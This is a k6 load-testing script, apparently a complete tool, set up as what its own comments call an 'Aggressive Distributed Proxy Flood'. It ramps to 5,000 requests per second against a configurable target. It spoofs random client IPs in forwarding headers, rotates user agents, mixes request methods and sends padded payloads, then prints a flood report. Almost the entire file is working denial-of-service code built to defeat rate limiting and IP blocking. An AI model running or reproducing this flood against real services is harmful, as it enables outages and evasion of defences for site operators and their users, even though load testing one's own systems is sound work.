import http from "k6/http";
import { check } from "k6";
import { Rate, Counter } from "k6/metrics";

const errorRate = new Rate("errors");
const totalHits = new Counter("total_hits");

// =============================================================
// Aggressive Distributed Proxy Flood
// Spoofs thousands of IPs, random user agents, mixed methods
// =============================================================

export const options = {
  scenarios: {
    distributed: {
      executor: "ramping-arrival-rate",
      startRate: 100,
      timeUnit: "1s",
      stages: [
        { duration: "5s", target: 1000 },
        { duration: "10s", target: 3000 },
        { duration: "30s", target: 5000 },
        { duration: "20s", target: 5000 },
        { duration: "10s", target: 0 },
      ],
      preAllocatedVUs: 3000,
      maxVUs: 8000,
    },
  },
  thresholds: {
    http_req_failed: [{ threshold: "rate<1.0", abortOnFail: false }],
  },
  discardResponseBodies: true,
  noConnectionReuse: true,
  batch: 30,
  batchPerHost: 30,
};

const TARGET = __ENV.TARGET_URL || "http://target:80";

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.6099.43 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
  "curl/8.4.0",
  "python-requests/2.31.0",
  "Go-http-client/2.0",
];

const METHODS = ["GET", "GET", "GET", "POST", "HEAD"]; // Weighted toward GET
const PATHS = ["/", "/api/data", "/health", "/api/data?q=test", "/api/data?ts=" ];
const PAYLOADS = [
  '{"action":"query","data":"' + "A".repeat(1000) + '"}',
  '{"flood":true,"payload":"' + "B".repeat(2000) + '"}',
  '{"bulk":' + JSON.stringify(Array(50).fill({ id: 1, val: "x".repeat(100) })) + '}',
];

export default function () {
  const method = METHODS[Math.floor(Math.random() * METHODS.length)];
  const path = PATHS[Math.floor(Math.random() * PATHS.length)];
  const url = `${TARGET}${path}${path.includes("ts=") ? Date.now() : ""}`;

  const params = {
    headers: {
      "User-Agent": USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
      "X-Forwarded-For": randIP(),
      "X-Real-IP": randIP(),
      "X-Client-IP": randIP(),
      "Accept": "text/html,application/json,*/*",
      "Accept-Language": "en-US,en;q=0.9,km;q=0.8",
      "Cache-Control": "no-cache",
      "Connection": "close",
    },
    timeout: "3s",
  };

  let res;
  try {
    if (method === "POST") {
      params.headers["Content-Type"] = "application/json";
      res = http.post(url, PAYLOADS[Math.floor(Math.random() * PAYLOADS.length)], params);
    } else if (method === "HEAD") {
      res = http.head(url, params);
    } else {
      res = http.get(url, params);
    }
    totalHits.add(1);
    errorRate.add(res.status !== 200);
  } catch (e) {
    errorRate.add(1);
  }
}

function randIP() {
  return `${rand(1,223)}.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`;
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

export function handleSummary(data) {
  const m = data.metrics;
  console.log("\n======= DISTRIBUTED FLOOD REPORT =======");
  console.log(`Total Requests:     ${m.http_reqs.values.count}`);
  console.log(`Requests/sec:       ${m.http_reqs.values.rate.toFixed(0)}`);
  console.log(`Avg Response:       ${m.http_req_duration.values.avg.toFixed(1)}ms`);
  console.log(`P95 Response:       ${m.http_req_duration.values["p(95)"].toFixed(1)}ms`);
  console.log(`Max Response:       ${m.http_req_duration.values.max.toFixed(1)}ms`);
  console.log(`Failed:             ${(m.http_req_failed.values.rate * 100).toFixed(1)}%`);
  console.log(`Error Rate:         ${(m.errors.values.rate * 100).toFixed(1)}%`);
  console.log("=========================================\n");
  return { stdout: JSON.stringify(m, null, 2) };
}
